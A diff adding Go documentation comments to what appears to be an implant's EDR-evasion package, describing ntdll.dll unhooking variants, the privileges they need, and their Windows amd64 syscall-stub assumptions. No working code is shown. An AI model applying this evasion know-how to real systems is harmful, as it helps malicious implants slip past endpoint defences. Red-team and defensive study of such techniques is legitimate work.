@@ -42,6 +42,26 @@
 // instrumentable. PerunUnhook (process-spawn variant) leaves the
 // suspended-child-process artefact.
 //
+// # Required privileges
+//
+// unprivileged for the calling process —
+// `NtProtectVirtualMemory` against own-process pages
+// needs no extra privilege; reading `ntdll.dll` from disk
+// or from a freshly spawned suspended child requires
+// only the standard read DACL on `C:\Windows\System32\ntdll.dll`
+// (granted to every user). `PerunUnhook`'s suspended-
+// child spawn happens inside the implant's own session,
+// no elevation. Cross-process unhook is out of scope —
+// callers route the patch into a remote process via
+// `evasion/hook.RemoteInstall` instead.
+//
+// # Platform
+//
+// Windows-only (`//go:build windows`) and amd64-only.
+// The 5-byte `mov r10, rcx; mov eax, SSN` prologue is
+// x64-specific; ARM64 ntdll uses a different stub layout
+// not yet wired up.
+//
 // # Example
 //
 // See [ExampleClassic] and [ExampleFull] in unhook_example_test.go.
